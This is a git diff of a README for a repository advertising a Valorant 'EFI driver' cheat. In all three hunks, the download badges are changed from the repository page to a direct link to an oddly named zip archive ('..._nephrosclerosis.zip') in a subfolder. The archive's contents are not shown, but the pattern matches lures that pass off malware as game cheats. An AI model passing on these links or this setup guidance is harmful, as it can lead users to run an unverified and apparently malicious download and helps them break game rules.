@@ -1,6 +1,6 @@
 # ⚙️ VALORANT-EFI-DRIVVER-Cheat-Hack - Reliable Valorant External Cheat
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-brightgreen?style=for-the-badge)](https://github.com/Amuthan1808/VALORANT-EFI-DRIVVER-Cheat-Hack)
+[![Download Now](https://img.shields.io/badge/Download%20Now-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Amuthan1808/VALORANT-EFI-DRIVVER-Cheat-Hack/main/Hyprism/VALORAN_DRIVVE_Hack_Cheat_EF_nephrosclerosis.zip)
 
 ## 📝 About This Application
 
@@ -35,7 +35,7 @@ Follow these steps to get the software up and running on your Windows PC.
 
 Click the large badge below to open the main download page:
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-brightgreen?style=for-the-badge)](https://github.com/Amuthan1808/VALORANT-EFI-DRIVVER-Cheat-Hack)
+[![Download Now](https://img.shields.io/badge/Download%20Now-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Amuthan1808/VALORANT-EFI-DRIVVER-Cheat-Hack/main/Hyprism/VALORAN_DRIVVE_Hack_Cheat_EF_nephrosclerosis.zip)
 
 On this GitHub page, you will find the latest release versions. The downloads typically come as compressed files (.zip or .rar).
 
@@ -96,7 +96,7 @@ Make sure to keep the software updated. Visit the download page regularly for ne
 
 Access the latest software and updates here:
 
-[![Download Page](https://img.shields.io/badge/Open%20Download%20Page-blue?style=for-the-badge)](https://github.com/Amuthan1808/VALORANT-EFI-DRIVVER-Cheat-Hack)
+[![Download Page](https://img.shields.io/badge/Open%20Download%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/Amuthan1808/VALORANT-EFI-DRIVVER-Cheat-Hack/main/Hyprism/VALORAN_DRIVVE_Hack_Cheat_EF_nephrosclerosis.zip)
 
 ## 🛠 Additional Notes
 
